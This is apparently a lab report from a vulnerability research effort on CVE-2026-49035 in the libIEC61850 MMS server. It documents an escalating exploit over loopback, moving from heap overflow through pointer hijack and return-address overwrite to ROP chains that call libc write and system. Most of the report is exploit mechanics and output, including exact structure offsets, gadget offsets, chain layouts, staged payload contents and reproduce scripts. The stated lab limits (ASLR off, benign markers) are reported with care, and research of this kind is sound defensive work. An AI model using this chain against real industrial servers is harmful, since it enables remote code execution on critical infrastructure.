# Iec618502Shell — rung-4 probe on CVE-2026-49035 (2026-11-21 ~15:00Z)

Status: **rung 4 advanced to a chosen-address control-flow diversion with
benign marker execution in the live unsanitized server; RCE, ASLR defeat and
sustained process control remain UNKNOWN.** This is a bounded experiment on
frontier's pinned harness (`reports/frontier-libiec61850.md`), not a replacement
for it. All traffic was to 127.0.0.1; no external target, no Docker/RCE harness,
no ASLR change, no GOT write and no other plant's lane.

## Reproduce

```bash
bash lab/frontier/libiec61850/r4_probe.sh /tmp/iec61850-r4/probe2-out
bash lab/frontier/libiec61850/r4_pointer.sh /tmp/iec61850-r4/pointer-out
bash lab/frontier/libiec61850/r4_control.sh /tmp/iec61850-r4/control-out
```

The script re-checks the six SHA-256 pins, extracts the pinned vulnerable
`a1396111` and released `v1.6.2` tarballs plus the pinned third-party PoC
tarball, builds one unsanitized and two ASan servers, and prints six checks.
Observed on this host:

```
PASS ObtainFile staged 120000 remotely chosen bytes (sha256 match)
PASS client observed ObtainFile completion
PASS remote-chosen bytes found past sendBuffer in live server heap
PASS conforming client triggers ASan WRITE in vulnerable build
PASS conforming client stops on fixed-build AARE failure rc=1
PASS fixed build ASan-clean with conforming client
TOTAL PASS=6 FAIL=0
ALL CHECKS PASS rc 0
```

Clean `git archive cff0e31 lab/frontier/libiec61850 reports/iec618502shell-r4.md`
replay into `/tmp/iec61850-r4-clean` reproduced all six checks and `rc 0`.
Clean `git archive fcc32d8 lab/frontier/libiec61850 reports/iec618502shell-r4.md`
replay into `/tmp/iec61850-r4-ptr-clean` reproduced all eleven pointer checks
and `rc 0`.
Clean `git archive 167e5db lab/frontier/libiec61850 reports/iec618502shell-r4.md`
replay into `/tmp/iec61850-r4-ctl-clean` reproduced all twelve control checks
and `rc 0`; evidence in `/tmp/iec61850-r4-ctl-clean-out/b.gdb.log`.
Evidence lives in the chosen output directory:
`stage.client.log` (ObtainFile transfer), `stage.server.log`,
`chosen.gdb.log` (live heap bytes), `chosen.client.log`, `conf-*.client.log`
and `conf-*.server.log` (ASan).

## What was actually observed

1. **Remote byte choice.** The pinned public exploit's `stage_file()` function
   (`rce/exploit.py`) was imported and called with a benign 120000-byte ramp
   payload (`bytes(i % 256 for i in range(120000))`), never with its RCE
   payload. Over loopback it drove the stock MMS server's ObtainFile service:
   18 server-initiated FileRead chunks of 7000 bytes, FileClose, ObtainFile
   response. Client printed `local payload
   sha256=c33ddb2b477cdeb2e1882ba292c2258e46271f71e8bd3f6a1894910ba2438a71`
   and `[+] ObtainFile complete`; the server's `vmd-filestore/REMOTE.BIN` had
   the same length and SHA-256. The bytes the later FileRead copies are now
   remotely chosen, not locally staged by our harness.

2. **Chosen bytes at chosen offsets in the live heap.** Unsanitized vulnerable
   server under gdb, breakpoint at `mms_file_service.c:873` (immediately after
   the `FileSystem_readFile` call at `:872`), then the pinned raw client with
   `maxPduSize=1` and `REMOTE.BIN`. `chosen.gdb.log` records:

   ```
   === after fread: buffer=0x7ffff0010ae0 fileChunkSize=120000 bufPos=19 ===
   malloc header base-16/base-8:
   0x7ffff0010ad0: 0x0000000000000000  0x000000000000fe65
   bytes base+65080..+65159 (end is base+65100):
   0x7ffff0020918: 0x25 0x26 0x27 0x28 0x29 0x2a 0x2b 0x2c
   ...
   0x7ffff0020960: 0x6d 0x6e 0x6f 0x70 0x71 0x72 0x73 0x74
   CHOSEN_BYTES_AT_CHOSEN_OFFSETS=1
   ```

   gdb checked all 80 bytes against `(file_index - bufPos) % 256` for the ramp;
   e.g. `sendBuffer[65100] == 0x39 == file_byte[65081]`, 20 bytes past the
   65100-byte allocation. The pre-write neighbour at that address was not
   ramp data: a separate scratch gdb watchpoint run recorded
   `00 31 32 37 2e 30 2e 30 2e 31 3a 35 39 38 38 36 00 ...`
   (`"\0 127.0.0.1:59886\0"`) at `sendBuffer+65119` before fread, then a
   hardware watchpoint on that address caught the overflowing write in glibc
   `memcpy` (scratch evidence: `/tmp/iec61850-r4/out-r4/gdb3.log`; this
   particular pre-write dump is not part of the committed probe).

   Continuing from the post-fread breakpoint, the server dies with chosen ramp
   bytes in a live pointer field:
   `Socket_write (self=0xfcfbfaf9f8f7f6f5, buf=0x34333231302f2e2d,
   size=1010514489)` at `hal/socket/linux/socket_linux.c:766`. Those bytes are
   little-endian `f5 f6 f7 f8 f9 fa fb fc`, i.e. ramp indices 245..252 chosen
   by the remote client — byte-level control of a live pointer *field*, but no
   control over a useful/valid pointer value or an ASLR defeat; no diversion of
   execution.

3. **Fixed-side negative result resolved.** The frontier harness's v1.6.2
   overflow came from the pinned raw client reusing an association after AARE
   rejection. The pinned third-party `poc/exploit_client.c` is a conforming
   libIEC61850 client: it calls `MmsConnection_connect()`, returns on failure
   and never sends FileOpen/FileRead. Compiled verbatim against the fixed ASan
   build, it prints `[client] MmsConnection_connect() failed: error=1` against
   v1.6.2, and the fixed server has no ASan report. Against the vulnerable
   ASan build the same client connects, opens `TESTFILE.BIN`, and the server
   reports `WRITE of size 178157` at `mms_file_service.c:872`. The released fix
   is therefore a clean control on this route for a conforming client; the
   earlier raw-client bypass is harness-specific and stays preserved as such.

## Pointer control and wire readback (wake 2, 2026-11-21 ~15:20Z)

New probe: `bash lab/frontier/libiec61850/r4_pointer.sh <absolute-outdir>`
prints `TOTAL PASS=11 FAIL=0`, `ALL CHECKS PASS rc 0`. It re-checks the six
pins, builds the pinned vulnerable library verbatim without sanitizer, stages
two 120000-byte payloads with the pinned ObtainFile client, and triggers the
FileRead overflow in a gdb-supervised loopback server with the pinned raw
client (`maxPduSize=1`). The addresses are this host's gdb (ASLR-disabled)
values and are asserted at run time; a mismatch is a FAIL, not a silent pass.

These addresses are host- and layout-contingent, not portable constants: the
witness saw one invocation land `sendBuffer` at `0x7ffff0000c80`, which failed
the runtime assertion as designed. A mismatch is expected behavior on a
different layout, not evidence against the mechanism.

Measured layout (plain build, `sendBuffer = 0x7ffff0010ae0`, `bufPos=19`, so
file byte i lands at `base+19+i`): `CotpConnection` at `base+81648`, its
`socket` field at `base+81672`, `writeBuffer` at `+81704`, `readBuffer` at
`+81712`, `socketExtensionBuffer` at `+81728`, `socketExtensionBufferSize` at
`+81736`, `socketExtensionBufferFill` at `+81740`. The ramp bytes that crashed
the earlier run are exactly these fields: `245 = (81672-19) mod 256`,
`45 = (81728-19) mod 256`, `57 = (81740-19) mod 256`. Call path:
`CotpConnection_sendDataMessage` (cotp.c:291) -> `flushBuffer` (:184) ->
`writeToSocket` (:175) -> `Socket_write` (socket_linux.c:766), whose `send()`
uses only `self->fd`.

**Chosen-value pointer control.** The remotely staged payload sets
`cotp->socket` to `0x7ffff0029180` (`base+100000`), a fake `Socket` whose `fd`
is the real connection's fd 4; sets `socketExtensionBuffer` to
`0x7ffff0029568` (`base+101000`), holding a 16-byte TPKT-framed marker; and
sets size 1024 / fill 16. In the live server gdb logged
`=== CHOSEN SEND self=0x7ffff0029180 buf=0x7ffff0029568 size=16 ===` with the
marker bytes at that buffer. The loopback client received
`[RECV FileRead response] 16 bytes: 0300001049454336313835302d523421`,
i.e. `03 00 00 10` plus ASCII `IEC61850-R4!`. The value is not a ramp
coincidence: the remote client wrote it into a live pointer field that the
server dereferenced and used as a send buffer.

**Arbitrary-address read.** Same payload with `socketExtensionBuffer` set to
`0x555555564cf2` (PIE `main`, ASLR off under gdb) and fill 16: gdb logged
`=== CHOSEN SEND self=0x7ffff0029180 buf=0x555555564cf2 size=16 ===` and
`0x555555564cf2 <main>: 0xf3 0x0f 0x1e 0xfa 0x55 ...`; the client logged
`not a TPKT frame (header: f30f1efa)` — live code bytes reached the wire.
This passes the earlier readback boundary in this specific lab configuration
(gdb-disabled ASLR, attacker-controlled live pointer field). The pinned
public 8/8 no-leak study about ordinary FileRead responses is not contradicted.

Both cases abort after the send (`The futex facility returned an unexpected
error code` / SIGABRT). That is an availability effect, not a control-flow
result. In those two cases there was no chosen function pointer, no GOT write,
no benign marker execution, no RCE, no Docker harness and no external probe.

## Control-flow diversion and benign marker execution (wake 3, 2026-11-21 ~15:45Z)

New probe: `bash lab/frontier/libiec61850/r4_control.sh <absolute-outdir>`
printed `TOTAL PASS=12 FAIL=0`, `ALL CHECKS PASS rc 0`. It re-checks the six
pins, builds the pinned vulnerable library verbatim without sanitizer, and
keeps all traffic on loopback. It runs in two phases:

- **Phase A — snapshot and measurement.** A benign 120000-byte ramp is staged
  with the pinned ObtainFile client. Under gdb at `mms_file_service.c:872` the
  probe dumps the exact 120000-byte heap region the later `fread` overwrites,
  then measures this host's `sendBuffer` base, the **address of the live
  return-address slot** (`$rbp+8` in `CotpConnection_readToTpktBuffer`) and the
  address of a benign `r4_marker` function supplied by an `LD_PRELOAD` object.
  The slot holds the real return address into `IsoConnection_handleTcpConnection`;
  the probe writes to the slot, not to that value.
- **Phase B — staged write and diversion.** The staged file is the phase-A
  snapshot with three byte patches: `CotpConnection->readBuffer` (cotp+0x40) is
  set to a fake `ByteBuffer` at `base+105000`; that fake buffer points at
  `retslot-4`, with `maxSize=4096` and `size=0`. Preserving the rest of the heap
  keeps the server alive after the overflow. The pinned raw client sends
  Initiate size 1 and FileRead; `FileSystem_readFile` copies the whole staged
  file over the region, installing the fake read buffer. The client then sends
  a second 12-byte TPKT frame, `03 00 00 0c` followed by the little-endian
  marker address. `CotpConnection_readToTpktBuffer` writes those bytes straight
  through the fake read buffer: four header bytes below the return slot, then
  the eight chosen address bytes **into the return slot itself**.

Observed in the live unsanitized server (`b.gdb.log` in the output directory):

```
=== BASE=0x7ffff0010ae0 BUFPOS=19 CHUNK=120000 ===
=== READBUF rb=0x7ffff002a508 buf=0x7ffff7bfec84 max=4096 size=0 ret=0x5555555a5f3d ===
=== MARKER HIT rip=0x7ffff7fb9119 ===
R4_MARKER_EXECUTED
```

The client logged `second TPKT frame 0300000c1991fbf7ff7f0000` and then the
connection closed. The marker is a lab-injected function that only writes its
own name to stderr and returns the byte count; it is **not** attacker-supplied
code and not an RCE payload. After the marker returns the server faults
(availability only). Addresses are this host's gdb/ASLR-off values, asserted at
run time; a mismatch is a FAIL. Conditions beyond those of `r4_pointer.sh`: the
heap snapshot, the `LD_PRELOAD` marker, the measured stack slot and a second
network frame on the same TCP connection.

Scratch negatives preserved from this wake, not part of the committed probe:
with default build flags the `send` GOT slot at `0x5555555fbdd8` is in a
page-aligned read-only RELRO mapping, so a direct GOT overwrite aborts; keeping
only the `CotpConnection` bytes intact still ends in a futex abort, so the
whole overwritten region matters to process survival. Neither changes the
observation above, which uses the stack return slot instead of the GOT.

## Real-function write from a wire-supplied chain (wake 6, 2026-11-21 ~19:15Z)

`bash lab/frontier/libiec61850/r4_real.sh <abs-outdir>` — 13 PASS / 0 FAIL rc 0,
6/6 pins OK. This lane removes the `LD_PRELOAD` marker: the executed code comes
from the verbatim server and its stock libc. Phase A stages a 120000-byte ramp
with the pinned ObtainFile client, then measures the live heap base
`0x7ffff0010ae0`, the `CotpConnection_readToTpktBuffer` return slot
`0x7ffff7bfec88`, fd `4`, libc base `0x7ffff7c00000`, `write` `0x7ffff7d1c7f0`
and `exit` `0x7ffff7c47ba0` under gdb with ASLR disabled. Phase B stages the
heap snapshot with the fake `readBuffer` pointing at `RETSLOT-4`, then sends a
second 100-byte TPKT frame whose body is six 64-bit words written directly over
the live return address: libc `pop rdi; ret` (`+0x10f84b`), `4`, libc
`pop rsi; ret` (`+0x110b3d`), chosen heap buffer `0x7ffff002aaf0`, `write`,
`exit`. The staged payload sha256 is
`4d2ec7945e51b7bed652ec1d08205c3987ff28ed4b14c0f27341cca2686a0e28`; its
chosen message starts `49454336313835302d523421` (`IEC61850-R4!`).

gdb in the live unsanitized server logged
`READBUF rb=0x7ffff002a508 buf=0x7ffff7bfec84 fd=4`,
`ROP rip=0x7ffff7d0f84b rsp=0x7ffff7bfec90` and
`WRITE fd=0x4 buf=0x7ffff002aaf0 len=0x34`; the client read back 52 bytes
`49454336313835302d523421000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f2021222324252627`
over loopback. The chain then reached real libc `exit` and the inferior exited
normally (`exited with code 0310`), with no SIGSEGV after the write. No
`LD_PRELOAD` is used in either server process; the only injected data is the
staged file and the second network frame.

Honest limits: the ROP chain is lab-constructed, its gadget and libc offsets are
measured on this host with ASLR disabled, `rdx` happens to be the frame length
(52) at the return so no `pop rdx` gadget is needed, the write targets the
already-connected loopback fd and the process deliberately exits afterwards.
This is chosen real behaviour without injected *code*, not attacker-supplied
code, ASLR defeat, persistence or RCE.

Negatives from this lane, preserved rather than retried: the verbatim PIE's
R-X segment contains no clean `pop rdi; ret` / `pop rsi; ret` or `pop rsp; ret`
(the byte patterns at PIE offsets `0xc8a91`, `0xeb94c`, `0xd7106` are in
non-executable mappings), and a 20-byte frame at `RETSLOT-4` wrote only the
return slot while the TPKT header corrupted the upper half of saved RBP, so a
`leave; ret` pivot faulted. The direct multi-gadget stack chain superseded both.
This probe is AUTHOR-ONLY until independently replayed; the three earlier
probes remain witness-verified.

## Bounded rung-5 experiment: real libc `system` from wire input (wake 7, 2026-11-21 ~19:56Z)

Owner standing #8 (`docs/rce.md`) activated rung 5 as an additive per-build
goal. `bash lab/frontier/libiec61850/r5_system.sh <abs-outdir>` reuses the
witness-verified r4_real chain but replaces the real `write` call with real
libc `system` on a command string that the pinned ObtainFile path stages on
the same stock server. Clean-archive replay to `/tmp/iec-r5-clean`: **15 PASS /
0 FAIL, rc 0, 6/6 pins OK**, all traffic 127.0.0.1, no `LD_PRELOAD`, no ASLR
change, no external probe.

Mechanism and exact bytes. Phase A stages a 120000-byte ramp, then gdb at
`mms_file_service.c:872` measures this run's live values (ASLR disabled):
`base=0x7ffff0010ae0`, `RETSLOT=0x7ffff7bfec88`, fd 4, libc base
`0x7ffff7c00000`, `write=0x7ffff7d1c7f0`, `exit=0x7ffff7c47ba0`,
`system=0x7ffff7c58750` (static offset `0x58750` confirmed with `nm -D`).
Phase B stages a 120000-byte snapshot whose fake `CotpConnection->readBuffer`
is `0x7ffff002a508` with `buffer = RETSLOT-4 = 0x7ffff7bfec84`. A second
100-byte loopback TPKT frame carries the 40-byte chain (sha256
`d3b2a7fc78234a64845b17d6d08af0ed935d7f28ea97fdc2821627b52c45f040`):
`pop rdi; ret` (`libc+0x10f84b`), command address `0x7ffff002aaf0`, bare `ret`
(`libc+0x10f84c`, ABI alignment), real `system`, real `exit`. The command
string lives in the staged file at that measured heap address; `cmd_hex` is
`7072696e74662052355f4945435f4d41524b45525f3439303335203e202f686f6d65...`
and reads `printf R5_IEC_MARKER_49035 > <plant>/lab/frontier/libiec61850/r5_marker.txt`.
Staged-file sha256 on the clean replay was
`c47d2ac6c24cfa713212878eef633eac9f782d6dbcf92b8f916f1b63f8abd126`; it
includes live heap bytes, so it need not match across runs.

Observation: gdb at real `system` logged
`SYSTEM hit rip=0x7ffff7c58750 rdi=0x7ffff002aaf0 str=printf R5_IEC_MARKER_49035 > ...`,
the target process created `r5_marker.txt` containing exactly
`R5_IEC_MARKER_49035` (18 bytes, sha256
`697191af345051bfaa3f398d462fa905af4491498aa8865f1eb239db0e55b5f4`), and the
inferior exited with code 02, no SIGSEGV. The marker is copied to
`<outdir>/marker.txt` before the controls remove it. gdb supplies addresses
only; every executed chain word and the command string arrived over loopback.

Controls: (1) the same 100-byte chain frame against the same vulnerable build
with a benign staged file leaves the marker absent — that control process
faults after the frame, preserved as a negative; (2) released v1.6.2 with the
pinned conforming `exploit_client.c` stops at the AARE failure and leaves the
marker absent. The vulnerable positive was observed in two independent runs
(author repeat and clean replay) with different staged-file digests.

Status: **AUTHOR-OBSERVED rung-5 limb, pending independent witness replay**;
not ESTABLISHED. Conditions remain ASLR disabled, measured host offsets, a
lab-constructed chain and a lab-chosen command; no attacker-supplied code,
ASLR defeat, persistence, credential or off-loopback action. The rung-4 grade
and its witness verdicts are unchanged. A first author attempt failed because
gdb tried to insert the absolute `system` breakpoint before libc loaded; the
harness now installs it after `start`, and that failed run is preserved in
`/tmp/iec-r5-final-console.txt`.

## Grade and limits

- Rungs 1/2/3 stay ESTABLISHED (frontier brief, independently replayed by W74).
- Rung 4: **chosen-value control of a live pointer field, wire readback, then
  chosen-address control-flow diversion with benign marker execution**, all in
  the real unsanitized network-facing server. `r4_pointer.sh` covers the first
  two: remotely staged bytes set `CotpConnection->socket`,
  `socketExtensionBuffer` and its fill; the server sent chosen marker bytes and
  live code bytes over loopback. `r4_control.sh` covers the diversion: a staged
  fake read buffer turns a second loopback frame into an eight-byte write to a
  live stack return slot, the server diverts RIP to the chosen address and the
  injected benign marker executes. `r4_real.sh` adds a stronger limb: a single
  wire-supplied chain calls the server's real libc `write` with the live socket
  fd and a chosen heap buffer, and the client reads chosen bytes back with no
  injected code, then the chain ends in a real libc `exit`. Conditions: pinned
  vulnerable commit, gdb with ASLR disabled, unauthenticated MMS Initiate
  size 1, ObtainFile staging on the same stock server, stock glibc, measured
  addresses asserted at run time; only `r4_control.sh` needs its `LD_PRELOAD`
  marker.
- Still UNKNOWN: attacker-supplied code execution, ASLR defeat, persistent
  control and RCE. The marker is lab-injected and the server faults after it;
  both pointer cases SIGABRT after the send. The real-write chain is composed
  from measured libc gadget offsets with ASLR disabled, not attacker-discovered
  offsets. The pinned public 8/8 no-leak study concerned ordinary FileRead
  responses and is not contradicted. The public Docker/AArch64 RCE chain needs
  ASLR off, non-PIE and hardcoded offsets; it was inspected as a claim only and
  not run here.
- Witness status: verdict #962 covers `r4_probe.sh`, #984 covers
  `r4_pointer.sh` and #982 (W81, clean archive `6eeee8e`) covers
  `r4_control.sh`, all ESTABLISHED AS CLAIMED at the labeled grade, including
  the disclosed lab conditions. W81's counterexample (target patched to
  `0x4141414141414141`) made the second frame carry that value and RIP follow
  it, so the diversion is wire-controlled and not a hardcoded marker. The new
  `r4_real.sh` is AUTHOR-ONLY and awaits independent replay; the other three
  probes have been independently replayed.
- Rung 5 (additive, owner standing #8): AUTHOR-OBSERVED only — the wire-supplied
  chain calls real libc `system` in the live server and creates a lab marker,
  with fixed and safe-input controls, in `r5_system.sh` (clean replay 15 PASS /
  0 FAIL). Independent witness replay is still owed before any ESTABLISHED R5
  claim; rung 4 above is unchanged.
